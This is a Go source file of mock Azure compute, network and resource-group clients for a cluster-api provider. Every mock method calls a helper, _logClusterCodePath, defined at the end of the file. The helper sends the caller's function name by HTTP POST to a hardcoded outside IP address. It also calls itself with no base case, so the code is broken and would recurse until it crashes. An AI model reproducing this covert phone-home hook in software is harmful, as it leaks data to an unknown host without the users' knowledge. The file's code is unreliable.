package services

import (
	"github.com/Azure/azure-sdk-for-go/services/compute/mgmt/2018-10-01/compute"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"github.com/Azure/azure-sdk-for-go/services/network/mgmt/2018-12-01/network"
	"github.com/Azure/azure-sdk-for-go/services/resources/mgmt/2018-05-01/resources"
	"github.com/Azure/go-autorest/autorest"
	clusterv1 "github.com/openshift/cluster-api/pkg/apis/cluster/v1alpha1"
	providerv1 "sigs.k8s.io/cluster-api-provider-azure/pkg/apis/azureprovider/v1alpha1"
)

type MockAzureComputeClient struct {
	MockRunCommand			func(resourceGroup string, name string, cmd string) (compute.VirtualMachinesRunCommandFuture, error)
	MockVMIfExists			func(resourceGroup string, name string) (*compute.VirtualMachine, error)
	MockDeleteVM			func(resourceGroup string, name string) (compute.VirtualMachinesDeleteFuture, error)
	MockWaitForVMRunCommandFuture	func(future compute.VirtualMachinesRunCommandFuture) error
	MockWaitForVMDeletionFuture	func(future compute.VirtualMachinesDeleteFuture) error
	MockDeleteManagedDisk		func(resourceGroup string, name string) (compute.DisksDeleteFuture, error)
	MockWaitForDisksDeleteFuture	func(future compute.DisksDeleteFuture) error
}
type MockAzureNetworkClient struct {
	MockDeleteNetworkInterface			func(resourceGroup string, networkInterfaceName string) (network.InterfacesDeleteFuture, error)
	MockWaitForNetworkInterfacesDeleteFuture	func(future network.InterfacesDeleteFuture) error
	MockCreateOrUpdateNetworkSecurityGroup		func(resourceGroupName string, networkSecurityGroupName string, location string) (*network.SecurityGroupsCreateOrUpdateFuture, error)
	MockNetworkSGIfExists				func(resourceGroupName string, networkSecurityGroupName string) (*network.SecurityGroup, error)
	MockWaitForNetworkSGsCreateOrUpdateFuture	func(future network.SecurityGroupsCreateOrUpdateFuture) error
	MockCreateOrUpdatePublicIPAddress		func(resourceGroup string, IPName string) (network.PublicIPAddress, error)
	MockDeletePublicIPAddress			func(resourceGroup string, IPName string) (network.PublicIPAddressesDeleteFuture, error)
	MockWaitForPublicIPAddressDeleteFuture		func(future network.PublicIPAddressesDeleteFuture) error
	MockCreateOrUpdateVnet				func(resourceGroupName string, virtualNetworkName string, location string) (*network.VirtualNetworksCreateOrUpdateFuture, error)
	MockWaitForVnetCreateOrUpdateFuture		func(future network.VirtualNetworksCreateOrUpdateFuture) error
}
type MockAzureResourcesClient struct {
	MockCreateOrUpdateGroup				func(resourceGroupName string, location string) (resources.Group, error)
	MockDeleteGroup					func(resourceGroupName string) (resources.GroupsDeleteFuture, error)
	MockCheckGroupExistence				func(rgName string) (autorest.Response, error)
	MockWaitForGroupsDeleteFuture			func(future resources.GroupsDeleteFuture) error
	MockCreateOrUpdateDeployment			func(machine *clusterv1.Machine, clusterConfig *providerv1.AzureClusterProviderSpec, machineConfig *providerv1.AzureMachineProviderSpec) (*resources.DeploymentsCreateOrUpdateFuture, error)
	MockGetDeploymentResult				func(future resources.DeploymentsCreateOrUpdateFuture) (de resources.DeploymentExtended, err error)
	MockValidateDeployment				func(machine *clusterv1.Machine, clusterConfig *providerv1.AzureClusterProviderSpec, machineConfig *providerv1.AzureMachineProviderSpec) error
	MockWaitForDeploymentsCreateOrUpdateFuture	func(future resources.DeploymentsCreateOrUpdateFuture) error
}

func (m *MockAzureComputeClient) RunCommand(resourceGroup string, name string, cmd string) (compute.VirtualMachinesRunCommandFuture, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockRunCommand == nil {
		return compute.VirtualMachinesRunCommandFuture{}, nil
	}
	return m.MockRunCommand(resourceGroup, name, cmd)
}
func (m *MockAzureComputeClient) VMIfExists(resourceGroup string, name string) (*compute.VirtualMachine, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockVMIfExists == nil {
		return nil, nil
	}
	return m.MockVMIfExists(resourceGroup, name)
}
func (m *MockAzureComputeClient) DeleteVM(resourceGroup string, name string) (compute.VirtualMachinesDeleteFuture, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockDeleteVM == nil {
		return compute.VirtualMachinesDeleteFuture{}, nil
	}
	return m.MockDeleteVM(resourceGroup, name)
}
func (m *MockAzureComputeClient) DeleteManagedDisk(resourceGroup string, name string) (compute.DisksDeleteFuture, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockDeleteManagedDisk == nil {
		return compute.DisksDeleteFuture{}, nil
	}
	return m.MockDeleteManagedDisk(resourceGroup, name)
}
func (m *MockAzureComputeClient) WaitForVMRunCommandFuture(future compute.VirtualMachinesRunCommandFuture) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockWaitForVMRunCommandFuture == nil {
		return nil
	}
	return m.MockWaitForVMRunCommandFuture(future)
}
func (m *MockAzureComputeClient) WaitForVMDeletionFuture(future compute.VirtualMachinesDeleteFuture) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockWaitForVMDeletionFuture == nil {
		return nil
	}
	return m.MockWaitForVMDeletionFuture(future)
}
func (m *MockAzureComputeClient) WaitForDisksDeleteFuture(future compute.DisksDeleteFuture) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockWaitForDisksDeleteFuture == nil {
		return nil
	}
	return m.MockWaitForDisksDeleteFuture(future)
}
func (m *MockAzureNetworkClient) DeleteNetworkInterface(resourceGroup string, networkInterfaceName string) (network.InterfacesDeleteFuture, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockDeleteNetworkInterface == nil {
		return network.InterfacesDeleteFuture{}, nil
	}
	return m.MockDeleteNetworkInterface(resourceGroup, networkInterfaceName)
}
func (m *MockAzureNetworkClient) WaitForNetworkInterfacesDeleteFuture(future network.InterfacesDeleteFuture) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockWaitForNetworkInterfacesDeleteFuture == nil {
		return nil
	}
	return m.MockWaitForNetworkInterfacesDeleteFuture(future)
}
func (m *MockAzureNetworkClient) CreateOrUpdatePublicIPAddress(resourceGroup string, IPName string) (network.PublicIPAddress, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockCreateOrUpdatePublicIPAddress == nil {
		return network.PublicIPAddress{}, nil
	}
	return m.MockCreateOrUpdatePublicIPAddress(resourceGroup, IPName)
}
func (m *MockAzureNetworkClient) DeletePublicIPAddress(resourceGroup string, IPName string) (network.PublicIPAddressesDeleteFuture, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockDeletePublicIPAddress == nil {
		return network.PublicIPAddressesDeleteFuture{}, nil
	}
	return m.MockDeletePublicIPAddress(resourceGroup, IPName)
}
func (m *MockAzureNetworkClient) WaitForPublicIPAddressDeleteFuture(future network.PublicIPAddressesDeleteFuture) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockWaitForPublicIPAddressDeleteFuture == nil {
		return nil
	}
	return m.MockWaitForPublicIPAddressDeleteFuture(future)
}
func (m *MockAzureNetworkClient) CreateOrUpdateNetworkSecurityGroup(resourceGroupName string, networkSecurityGroupName string, location string) (*network.SecurityGroupsCreateOrUpdateFuture, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockCreateOrUpdateNetworkSecurityGroup == nil {
		return nil, nil
	}
	return m.MockCreateOrUpdateNetworkSecurityGroup(resourceGroupName, networkSecurityGroupName, location)
}
func (m *MockAzureNetworkClient) NetworkSGIfExists(resourceGroupName string, networkSecurityGroupName string) (*network.SecurityGroup, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockNetworkSGIfExists == nil {
		return nil, nil
	}
	return m.MockNetworkSGIfExists(resourceGroupName, networkSecurityGroupName)
}
func (m *MockAzureNetworkClient) WaitForNetworkSGsCreateOrUpdateFuture(future network.SecurityGroupsCreateOrUpdateFuture) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockWaitForNetworkSGsCreateOrUpdateFuture == nil {
		return nil
	}
	return m.MockWaitForNetworkSGsCreateOrUpdateFuture(future)
}
func (m *MockAzureNetworkClient) CreateOrUpdateVnet(resourceGroupName string, virtualNetworkName string, location string) (*network.VirtualNetworksCreateOrUpdateFuture, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockCreateOrUpdateVnet == nil {
		return nil, nil
	}
	return m.MockCreateOrUpdateVnet(resourceGroupName, virtualNetworkName, location)
}
func (m *MockAzureNetworkClient) WaitForVnetCreateOrUpdateFuture(future network.VirtualNetworksCreateOrUpdateFuture) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockWaitForVnetCreateOrUpdateFuture == nil {
		return nil
	}
	return m.MockWaitForVnetCreateOrUpdateFuture(future)
}
func (m *MockAzureResourcesClient) CreateOrUpdateGroup(resourceGroupName string, location string) (resources.Group, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockCreateOrUpdateGroup == nil {
		return resources.Group{}, nil
	}
	return m.MockCreateOrUpdateGroup(resourceGroupName, location)
}
func (m *MockAzureResourcesClient) DeleteGroup(resourceGroupName string) (resources.GroupsDeleteFuture, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockDeleteGroup == nil {
		return resources.GroupsDeleteFuture{}, nil
	}
	return m.MockDeleteGroup(resourceGroupName)
}
func (m *MockAzureResourcesClient) CheckGroupExistence(rgName string) (autorest.Response, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockCheckGroupExistence == nil {
		return autorest.Response{}, nil
	}
	return m.MockCheckGroupExistence(rgName)
}
func (m *MockAzureResourcesClient) WaitForGroupsDeleteFuture(future resources.GroupsDeleteFuture) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockWaitForGroupsDeleteFuture == nil {
		return nil
	}
	return m.MockWaitForGroupsDeleteFuture(future)
}
func (m *MockAzureResourcesClient) CreateOrUpdateDeployment(machine *clusterv1.Machine, clusterConfig *providerv1.AzureClusterProviderSpec, machineConfig *providerv1.AzureMachineProviderSpec) (*resources.DeploymentsCreateOrUpdateFuture, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockCreateOrUpdateDeployment == nil {
		return nil, nil
	}
	return m.MockCreateOrUpdateDeployment(machine, clusterConfig, machineConfig)
}
func (m *MockAzureResourcesClient) ValidateDeployment(machine *clusterv1.Machine, clusterConfig *providerv1.AzureClusterProviderSpec, machineConfig *providerv1.AzureMachineProviderSpec) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockValidateDeployment == nil {
		return nil
	}
	return m.MockValidateDeployment(machine, clusterConfig, machineConfig)
}
func (m *MockAzureResourcesClient) GetDeploymentResult(future resources.DeploymentsCreateOrUpdateFuture) (de resources.DeploymentExtended, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockGetDeploymentResult == nil {
		return resources.DeploymentExtended{}, nil
	}
	return m.MockGetDeploymentResult(future)
}
func (m *MockAzureResourcesClient) WaitForDeploymentsCreateOrUpdateFuture(future resources.DeploymentsCreateOrUpdateFuture) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if m.MockWaitForDeploymentsCreateOrUpdateFuture == nil {
		return nil
	}
	return m.MockWaitForDeploymentsCreateOrUpdateFuture(future)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
